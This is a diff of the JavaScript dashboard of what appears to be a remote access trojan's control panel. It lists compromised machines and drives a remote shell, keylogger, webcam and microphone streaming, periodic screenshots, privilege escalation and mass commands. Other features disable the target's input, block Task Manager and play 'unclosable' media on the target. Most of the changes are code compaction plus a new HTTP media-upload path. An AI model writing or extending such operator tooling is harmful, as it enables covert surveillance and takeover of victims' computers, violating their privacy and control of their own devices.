+  ctx.strokeStyle = '#ff3366'; ctx.lineWidth = 1.5; ctx.beginPath();
   const step = Math.ceil(samples.length/w);
-  for(let i=0;i<w;i++){
-    const s = samples[i*step]||0;
-    const y = (s*0.5+0.5)*h;
-    i===0 ? ctx.moveTo(i,y) : ctx.lineTo(i,y);
-  }
+  for(let i=0;i<w;i++){ const s=samples[i*step]||0; const y=(s*0.5+0.5)*h; i===0?ctx.moveTo(i,y):ctx.lineTo(i,y); }
   ctx.stroke();
 }
 function clearMicCanvas(){
@@ -852,8 +760,7 @@ function clearMicCanvas(){
   if(!canvas) return;
   const ctx = canvas.getContext('2d');
   canvas.width = canvas.offsetWidth;
-  ctx.fillStyle = '#050810';
-  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = '#050810'; ctx.fillRect(0,0,canvas.width,canvas.height);
 }
 
 socket.on('mic_data', data => {
@@ -881,7 +788,6 @@ socket.on('auto_screenshot', data => {
   div.innerHTML = `<img src="data:image/jpeg;base64,${data.data}" onclick="expandImg(this.src)">
     <div class="ss-info">${data.ts}</div>`;
   gallery.prepend(div);
-  // Keep max 30
   while(gallery.children.length > 30) gallery.removeChild(gallery.lastChild);
   document.getElementById('ss-status').textContent = 'LAST: '+data.ts;
 });
@@ -951,7 +857,6 @@ function openNode(id){
   document.getElementById('modal-title').textContent = selectedClient.hostname.toUpperCase();
   document.getElementById('modal-subtitle').textContent = selectedClient.ip+' · '+selectedClient.username;
   document.getElementById('modal-overlay').classList.add('open');
-  // Reset input-disable checkbox whenever a new node is opened
   document.getElementById('disable-input-toggle').checked = false;
   document.getElementById('block-taskmgr-toggle').checked = false;
   switchTab('screen');
@@ -960,10 +865,8 @@ function closeModal(){
   document.getElementById('modal-overlay').classList.remove('open');
   if(streaming) stopStream();
   if(webcamStreaming) stopWebcam();
-  // If input was disabled, re-enable it when we close the modal
   const cb = document.getElementById('disable-input-toggle');
   if(cb.checked){ cb.checked=false; if(selectedClient) sendCmdRaw('input_enable'); }
-  // If task manager block was on, turn it off
   const cb2 = document.getElementById('block-taskmgr-toggle');
   if(cb2.checked){ cb2.checked=false; if(selectedClient) sendCmdRaw('taskmgr_block_disable'); }
 }
@@ -1001,41 +904,25 @@ function toggleRemoteCtrl(on){
   if(on){ img.addEventListener('mousemove',onRMM); img.addEventListener('click',onRMC); img.addEventListener('contextmenu',onRRC); }
   else { img.removeEventListener('mousemove',onRMM); img.removeEventListener('click',onRMC); img.removeEventListener('contextmenu',onRRC); }
 }
-
 async function toggleDisableInput(on){
-  if(!selectedClient){
-    document.getElementById('disable-input-toggle').checked=false;
-    return;
-  }
+  if(!selectedClient){ document.getElementById('disable-input-toggle').checked=false; return; }
   const action = on ? 'input_disable' : 'input_enable';
   const label = document.getElementById('disable-input-toggle').closest('label');
   label.style.opacity='0.5';
   const res = await sendCmdRaw(action);
   label.style.opacity='1';
-  if(res.status==='ok'){
-    addLog((on?'⛔ Input disabled':'✅ Input re-enabled')+' on '+selectedClient.hostname, on?'error':'connect');
-  } else {
-    addLog('Input toggle failed: '+(res.msg||'unknown'),'error');
-    document.getElementById('disable-input-toggle').checked=!on;
-  }
+  if(res.status==='ok'){ addLog((on?'⛔ Input disabled':'✅ Input re-enabled')+' on '+selectedClient.hostname, on?'error':'connect'); }
+  else { addLog('Input toggle failed: '+(res.msg||'unknown'),'error'); document.getElementById('disable-input-toggle').checked=!on; }
 }
-
 async function toggleBlockTaskmgr(on){
-  if(!selectedClient){
-    document.getElementById('block-taskmgr-toggle').checked=false;
-    return;
-  }
+  if(!selectedClient){ document.getElementById('block-taskmgr-toggle').checked=false; return; }
   const action = on ? 'taskmgr_block_enable' : 'taskmgr_block_disable';
   const label = document.getElementById('block-taskmgr-toggle').closest('label');
   label.style.opacity='0.5';
   const res = await sendCmdRaw(action);
   label.style.opacity='1';
-  if(res.status==='ok'){
-    addLog((on?'🚫 Task Manager block ON':'✅ Task Manager block OFF')+' — '+selectedClient.hostname, on?'error':'connect');
-  } else {
-    addLog('Task Manager block failed: '+(res.msg||'unknown'),'error');
-    document.getElementById('block-taskmgr-toggle').checked=!on;
-  }
+  if(res.status==='ok'){ addLog((on?'🚫 Task Manager block ON':'✅ Task Manager block OFF')+' — '+selectedClient.hostname, on?'error':'connect'); }
+  else { addLog('Task Manager block failed: '+(res.msg||'unknown'),'error'); document.getElementById('block-taskmgr-toggle').checked=!on; }
 }
 function getImgXY(e){ const r=e.target.getBoundingClientRect(); return{x:Math.round(e.clientX-r.left),y:Math.round(e.clientY-r.top)}; }
 function onRMM(e){ if(!streaming||!selectedClient)return; socket.emit('mouse_move',{client_id:selectedClient.id,...getImgXY(e)}); }
@@ -1075,15 +962,13 @@ async function webcamSnap(){
 }
 function startWebcam(){
   if(!selectedClient) return;
-  webcamStreaming=true;
-  sendCmd('webcam_stream_start');
+  webcamStreaming=true; sendCmd('webcam_stream_start');
   document.getElementById('btn-wcam-start').disabled=true;
   document.getElementById('btn-wcam-stop').disabled=false;
   document.getElementById('webcam-status').textContent='STREAMING...';
 }
 function stopWebcam(){
-  webcamStreaming=false;
-  sendCmd('webcam_stream_stop');
+  webcamStreaming=false; sendCmd('webcam_stream_stop');
   document.getElementById('btn-wcam-start').disabled=false;
   document.getElementById('btn-wcam-stop').disabled=true;
   document.getElementById('webcam-status').textContent='STOPPED';
@@ -1099,8 +984,7 @@ async function runShell(){
   const inp=document.getElementById('shell-input');
   const cmd=inp.value.trim();
   if(!cmd||!selectedClient) return;
-  shellHistory.push(cmd); shellHistIdx=-1;
-  inp.value='';
+  shellHistory.push(cmd); shellHistIdx=-1; inp.value='';
   const out=document.getElementById('shell-output');
   out.innerHTML+=`<span class="shell-prompt-line">$ ${esc(cmd)}</span>\n`;
   const res=await sendCmdRaw('shell',{cmd});
@@ -1130,10 +1014,7 @@ function stopKeylog(){
   document.getElementById('kl-status').style.color='var(--dim)';
 }
 function clearKeylog(){ document.getElementById('keylog-output').innerHTML=''; }
-function copyKeylog(){
-  const text=document.getElementById('keylog-output').innerText;
-  navigator.clipboard.writeText(text).catch(()=>{});
-}
+function copyKeylog(){ navigator.clipboard.writeText(document.getElementById('keylog-output').innerText).catch(()=>{}); }
 
 // ── Mic ──
 async function startMic(){
@@ -1204,40 +1085,12 @@ async function getNetinfo(){
   document.getElementById('net-content').innerHTML='<div class="loading">Loading...</div>';
   const res=await sendCmdRaw('netinfo');
   if(res.status==='ok'){
-    const d=res.data;
-    let html='';
-    if(d.io){
-      html+=`<div class="net-section"><div class="net-title">I/O Stats</div>
-        <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:4px;">
-          ${[['Sent',fmtSize(d.io.bytes_sent)],['Received',fmtSize(d.io.bytes_recv)],['Pkts Out',d.io.packets_sent],['Pkts In',d.io.packets_recv]].map(([l,v])=>`
-          <div style="background:var(--panel2);border:1px solid var(--border);padding:10px;">
-            <div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-bottom:4px;">${l}</div>
-            <div style="font-size:14px;color:var(--accent2);">${v}</div>
-          </div>`).join('')}
-        </div></div>`;
-    }
-    if(d.interfaces&&d.interfaces.length){
-      html+=`<div class="net-section"><div class="net-title">Interfaces</div>
-        ${d.interfaces.map(i=>`<div class="net-iface"><span class="ni-name">${esc(i.iface)}</span><span class="ni-ip">${esc(i.ip)}</span><span class="ni-mask">${esc(i.netmask)}</span></div>`).join('')}
-      </div>`;
-    }
-    if(d.connections&&d.connections.length){
-      html+=`<div class="net-section"><div class="net-title">Connections (${d.connections.length})</div>
-        <table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th><th>Process</th></tr></thead>
-        <tbody>${d.connections.map(c=>`<tr>
-          <td><span class="tag ${c.proto==='TCP'?'tag-blue':'tag-green'}">${c.proto}</span></td>
-          <td style="font-size:10px">${esc(c.laddr)}</td>
-          <td style="font-size:10px;color:var(--accent2)">${esc(c.raddr)||'—'}</td>
-          <td style="font-size:10px;color:${c.status==='ESTABLISHED'?'var(--accent)':'var(--dim)'}">${esc(c.status)}</td>
-          <td style="font-size:10px;color:var(--dim)">${c.pid||''}</td>
-          <td style="font-size:10px">${esc(c.proc)}</td>
-        </tr>`).join('')}</tbody></table>
-      </div>`;
-    }
+    const d=res.data; let html='';
+    if(d.io){ html+=`<div class="net-section"><div class="net-title">I/O Stats</div><div style="display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:4px;">${[['Sent',fmtSize(d.io.bytes_sent)],['Received',fmtSize(d.io.bytes_recv)],['Pkts Out',d.io.packets_sent],['Pkts In',d.io.packets_recv]].map(([l,v])=>`<div style="background:var(--panel2);border:1px solid var(--border);padding:10px;"><div style="font-size:9px;color:var(--dim);letter-spacing:2px;margin-bottom:4px;">${l}</div><div style="font-size:14px;color:var(--accent2);">${v}</div></div>`).join('')}</div></div>`; }
+    if(d.interfaces&&d.interfaces.length){ html+=`<div class="net-section"><div class="net-title">Interfaces</div>${d.interfaces.map(i=>`<div class="net-iface"><span class="ni-name">${esc(i.iface)}</span><span class="ni-ip">${esc(i.ip)}</span><span class="ni-mask">${esc(i.netmask)}</span></div>`).join('')}</div>`; }
+    if(d.connections&&d.connections.length){ html+=`<div class="net-section"><div class="net-title">Connections (${d.connections.length})</div><table><thead><tr><th>Proto</th><th>Local</th><th>Remote</th><th>Status</th><th>PID</th><th>Process</th></tr></thead><tbody>${d.connections.map(c=>`<tr><td><span class="tag ${c.proto==='TCP'?'tag-blue':'tag-green'}">${c.proto}</span></td><td style="font-size:10px">${esc(c.laddr)}</td><td style="font-size:10px;color:var(--accent2)">${esc(c.raddr)||'—'}</td><td style="font-size:10px;color:${c.status==='ESTABLISHED'?'var(--accent)':'var(--dim)'}">${esc(c.status)}</td><td style="font-size:10px;color:var(--dim)">${c.pid||''}</td><td style="font-size:10px">${esc(c.proc)}</td></tr>`).join('')}</tbody></table></div>`; }
     document.getElementById('net-content').innerHTML=html||'<div class="no-data">No data</div>';
-  } else {
-    document.getElementById('net-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
-  }
+  } else { document.getElementById('net-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`; }
 }
 
 // ── Sysinfo ──
@@ -1245,19 +1098,15 @@ async function getSysinfo(){
   document.getElementById('sysinfo-content').innerHTML='<div class="loading">Loading...</div>';
   const res=await sendCmdRaw('sysinfo');
   if(res.status==='ok'){
-    const d=res.data;
-    const cc=v=>v>80?'danger':v>50?'warn':'';
+    const d=res.data; const cc=v=>v>80?'danger':v>50?'warn':'';
     document.getElementById('sysinfo-content').innerHTML=`<div class="sysinfo-grid">
       <div class="si-card"><div class="si-label">Hostname</div><div class="si-value accent2">${esc(d.hostname)}</div></div>
       <div class="si-card"><div class="si-label">Username</div><div class="si-value">${esc(d.username)}</div></div>
       <div class="si-card"><div class="si-label">Platform</div><div class="si-value">${esc(d.platform)}</div></div>
       <div class="si-card"><div class="si-label">IP</div><div class="si-value accent2">${esc(d.ip)}</div></div>
-      <div class="si-card"><div class="si-label">CPU</div><div class="si-value accent">${d.cpu_percent}%</div>
-        <div class="progress-bar"><div class="progress-fill ${cc(d.cpu_percent)}" style="width:${d.cpu_percent}%"></div></div></div>
-      <div class="si-card"><div class="si-label">RAM ${d.ram_used}/${d.ram_total} GB</div><div class="si-value accent">${d.ram_percent}%</div>
-        <div class="progress-bar"><div class="progress-fill ${cc(d.ram_percent)}" style="width:${d.ram_percent}%"></div></div></div>
-      <div class="si-card"><div class="si-label">Disk ${d.disk_used}/${d.disk_total} GB</div><div class="si-value accent">${d.disk_percent}%</div>
-        <div class="progress-bar"><div class="progress-fill ${cc(d.disk_percent)}" style="width:${d.disk_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">CPU</div><div class="si-value accent">${d.cpu_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.cpu_percent)}" style="width:${d.cpu_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">RAM ${d.ram_used}/${d.ram_total} GB</div><div class="si-value accent">${d.ram_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.ram_percent)}" style="width:${d.ram_percent}%"></div></div></div>
+      <div class="si-card"><div class="si-label">Disk ${d.disk_used}/${d.disk_total} GB</div><div class="si-value accent">${d.disk_percent}%</div><div class="progress-bar"><div class="progress-fill ${cc(d.disk_percent)}" style="width:${d.disk_percent}%"></div></div></div>
       <div class="si-card"><div class="si-label">Processes</div><div class="si-value accent2">${d.process_count}</div></div>
       <div class="si-card" style="grid-column:span 2"><div class="si-label">Boot Time</div><div class="si-value">${esc(d.boot_time)}</div></div>
     </div>`;
@@ -1271,21 +1120,9 @@ async function getProcesses(){
   if(res.status==='ok'){ allProcs=res.data; renderProcs(allProcs); }
   else document.getElementById('proc-content').innerHTML=`<div class="no-data" style="color:var(--warn)">Error: ${esc(res.msg)}</div>`;
 }
-function filterProcs(){
-  const q=document.getElementById('proc-filter').value.toLowerCase();
-  renderProcs(allProcs.filter(p=>(p.name||'').toLowerCase().includes(q)||String(p.pid).includes(q)));
-}
+function filterProcs(){ const q=document.getElementById('proc-filter').value.toLowerCase(); renderProcs(allProcs.filter(p=>(p.name||'').toLowerCase().includes(q)||String(p.pid).includes(q))); }
 function renderProcs(procs){
-  document.getElementById('proc-content').innerHTML=`<table class="proc-table"><thead><tr>
-    <th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th></th>
-  </tr></thead><tbody>${procs.map(p=>`<tr>
-    <td style="color:var(--dim)">${p.pid}</td>
-    <td>${esc(p.name||'')}</td>
-    <td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'var(--text)'}">${(p.cpu_percent||0).toFixed(1)}</td>
-    <td>${(p.memory_percent||0).toFixed(1)}</td>
-    <td style="color:var(--dim);font-size:10px">${esc(p.status||'')}</td>
-    <td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid})">KILL</button></td>
-  </tr>`).join('')}</tbody></table>`;
+  document.getElementById('proc-content').innerHTML=`<table class="proc-table"><thead><tr><th>PID</th><th>Name</th><th>CPU%</th><th>MEM%</th><th>Status</th><th></th></tr></thead><tbody>${procs.map(p=>`<tr><td style="color:var(--dim)">${p.pid}</td><td>${esc(p.name||'')}</td><td style="color:${(p.cpu_percent||0)>20?'var(--warn)':'var(--text)'}">${(p.cpu_percent||0).toFixed(1)}</td><td>${(p.memory_percent||0).toFixed(1)}</td><td style="color:var(--dim);font-size:10px">${esc(p.status||'')}</td><td><button class="btn btn-red btn-sm" onclick="killProc(${p.pid})">KILL</button></td></tr>`).join('')}</tbody></table>`;
 }
 async function killProc(pid){
   if(!confirm(`Kill PID ${pid}?`)) return;
@@ -1298,8 +1135,7 @@ async function killProc(pid){
 function startAutoSS(){
   if(!selectedClient) return;
   const interval=parseInt(document.getElementById('ss-interval').value)||30;
-  autoSS=true;
-  sendCmd('auto_ss_start',{interval});
+  autoSS=true; sendCmd('auto_ss_start',{interval});
   document.getElementById('btn-ss-start').disabled=true;
   document.getElementById('btn-ss-stop').disabled=false;
   document.getElementById('ss-status').textContent='ACTIVE every '+interval+'s';
@@ -1312,24 +1148,18 @@ function stopAutoSS(){
   document.getElementById('ss-status').textContent='STOPPED';
   document.getElementById('ss-status').style.color='var(--dim)';
 }
-function clearAutoSS(){
-  const g=document.getElementById('ss-gallery');
-  g.innerHTML='<div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div>';
-}
+function clearAutoSS(){ const g=document.getElementById('ss-gallery'); g.innerHTML='<div class="no-data" style="grid-column:1/-1;">Screenshots will appear here</div>'; }
 
 // ── Chat ──
 let chatSessionOpen = false;
-
 socket.on('chat_reply', data => {
   if(!selectedClient || data.client_id !== selectedClient.id) return;
   appendChatMsg('them', data.msg);
 });
-
 function openChatSession(){
   if(!selectedClient) return;
   chatSessionOpen = true;
-  const firstMsg = 'Chat session started. You can type below.';
-  sendCmdRaw('chat_open', {msg: firstMsg}).then(res => {
+  sendCmdRaw('chat_open', {msg: 'Chat session started. You can type below.'}).then(res => {
     if(res.status === 'ok'){
       document.getElementById('btn-chat-open').disabled = true;
       document.getElementById('btn-chat-close').disabled = false;
@@ -1337,20 +1167,15 @@ function openChatSession(){
       document.getElementById('btn-chat-send').disabled = false;
       document.getElementById('chat-session-status').textContent = '● SESSION ACTIVE';
       document.getElementById('chat-session-status').style.color = 'var(--accent)';
-      const container = document.getElementById('chat-messages');
-      container.innerHTML = '';
+      document.getElementById('chat-messages').innerHTML = '';
       appendChatMsg('sys', '— Session opened —');
       document.getElementById('chat-input').focus();
-    } else {
-      addLog('Chat open failed: '+res.msg,'error');
-    }
+    } else { addLog('Chat open failed: '+res.msg,'error'); }
   });
 }
-
 function closeChatSession(){
   if(!selectedClient) return;
-  chatSessionOpen = false;
-  sendCmd('chat_close');
+  chatSessionOpen = false; sendCmd('chat_close');
   document.getElementById('btn-chat-open').disabled = false;
   document.getElementById('btn-chat-close').disabled = true;
   document.getElementById('chat-input').disabled = true;
@@ -1359,17 +1184,14 @@ function closeChatSession(){
   document.getElementById('chat-session-status').style.color = 'var(--dim)';
   appendChatMsg('sys', '— Session closed —');
 }
-
 async function sendChat(){
   const inp = document.getElementById('chat-input');
   const msg = inp.value.trim();
   if(!msg || !selectedClient || !chatSessionOpen) return;
-  inp.value = '';
-  appendChatMsg('me', msg);
+  inp.value = ''; appendChatMsg('me', msg);
   const res = await sendCmdRaw('chat_msg', {msg});
   if(res.status !== 'ok') appendChatMsg('sys', '⚠ Delivery failed: '+(res.msg||'unknown'));
 }
-
 function appendChatMsg(type, text){
   const container = document.getElementById('chat-messages');
   const noData = container.querySelector('.no-data');
@@ -1402,8 +1224,7 @@ async function persistRemove(){
 // ── Privesc ──
 function _privescLog(msg, color){
   const el=document.getElementById('privesc-result');
-  const time=new Date().toTimeString().slice(0,8);
-  el.innerHTML+=`<span style="color:var(--dim)">[${time}]</span> <span style="color:${color||'var(--text)'}">${esc(msg)}</span>\n`;
+  el.innerHTML+=`<span style="color:var(--dim)">[${new Date().toTimeString().slice(0,8)}]</span> <span style="color:${color||'var(--text)'}">${esc(msg)}</span>\n`;
   el.scrollTop=el.scrollHeight;
 }
 async function privescCheckAdmin(){
@@ -1433,24 +1254,87 @@ async function adminCmd(action){
   el.scrollTop = el.scrollHeight;
 }
 
-// ── Play Media ──
-async function sendMedia(unclosable){
-  if(!selectedClient) return;
+// ── Play Media (HTTP upload — avoids WS size limit & logout) ──
+async function sendMedia(unclosable) {
+  if (!selectedClient) return;
   const fileInput = document.getElementById('media-file');
   const statusEl  = document.getElementById('media-status');
-  if(!fileInput.files.length){ statusEl.textContent='No file selected'; return; }
+  const progressBar  = document.getElementById('upload-progress');
+  const progressFill = document.getElementById('upload-progress-fill');
+
+  if (!fileInput.files.length) { statusEl.textContent = '✘ No file selected'; return; }
+
   const file = fileInput.files[0];
   const ext  = file.name.split('.').pop().toLowerCase();
-  statusEl.textContent = 'Reading...';
-  const reader = new FileReader();
-  reader.onload = async e => {
-    const b64 = e.target.result.split(',')[1];
-    statusEl.textContent = 'Sending...';
-    const res = await sendCmdRaw('play_media', {data: b64, ext, unclosable});
-    statusEl.textContent = res.status === 'ok' ? '✔ ' + res.msg : '✘ ' + res.msg;
-  };
-  reader.readAsDataURL(file);
+  const rid  = Math.random().toString(36).slice(2);
+
+  // Disable buttons while uploading
+  document.querySelectorAll('.btn-purple,.btn-red').forEach(b => b.disabled = true);
+  statusEl.textContent = 'Uploading...';
+  progressBar.style.display = 'block';
+  progressFill.style.width = '0%';
+
+  // Register pending listener BEFORE the upload so we never miss the response
+  const agentReply = new Promise(resolve => {
+    pendingCmds[rid] = resolve;
+    setTimeout(() => {
+      if (pendingCmds[rid]) { delete pendingCmds[rid]; resolve({ status: 'error', msg: 'Timeout waiting for agent' }); }
+    }, 90000);  // 90 s for large files
+  });
+
+  try {
+    // Use XMLHttpRequest so we get upload progress events
+    const uploadResult = await new Promise((resolve, reject) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', `/upload_media/${selectedClient.id}`);
+      xhr.setRequestHeader('X-Dashboard-Token', _dashboardToken);
+
+      xhr.upload.onprogress = e => {
+        if (e.lengthComputable) {
+          const pct = Math.round((e.loaded / e.total) * 100);
+          progressFill.style.width = pct + '%';
+          statusEl.textContent = `Uploading... ${pct}%`;
+        }
+      };
+
+      xhr.onload = () => {
+        try { resolve(JSON.parse(xhr.responseText)); }
+        catch(e) { reject(new Error('Bad server response')); }
+      };
+      xhr.onerror = () => reject(new Error('Network error during upload'));
+
+      const form = new FormData();
+      form.append('file',       file);
+      form.append('ext',        ext);
+      form.append('unclosable', unclosable ? 'true' : 'false');
+      form.append('rid',        rid);
+      xhr.send(form);
+    });
+
+    if (uploadResult.status !== 'ok') {
+      statusEl.textContent = '✘ Upload failed: ' + uploadResult.msg;
+      delete pendingCmds[rid];
+      return;
+    }
+
+    progressFill.style.width = '100%';
+    statusEl.textContent = 'Sent — waiting for agent...';
+
+    const res = await agentReply;
+    statusEl.textContent = res.status === 'ok'
+      ? '✔ ' + (res.msg || 'Playing')
+      : '✘ ' + (res.msg || 'Agent error');
+
+  } catch (err) {
+    statusEl.textContent = '✘ ' + err.message;
+    delete pendingCmds[rid];
+  } finally {
+    document.querySelectorAll('.btn-purple,.btn-red').forEach(b => b.disabled = false);
+    setTimeout(() => { progressBar.style.display = 'none'; progressFill.style.width = '0%'; }, 2000);
+  }
 }
+
+// ── Mass Cmd ──
 function openMassCmd(){ document.getElementById('mass-overlay').classList.add('open'); }
 document.getElementById('mass-overlay').addEventListener('click',e=>{ if(e.target===document.getElementById('mass-overlay')) document.getElementById('mass-overlay').classList.remove('open'); });
 async function runMassCmd(){
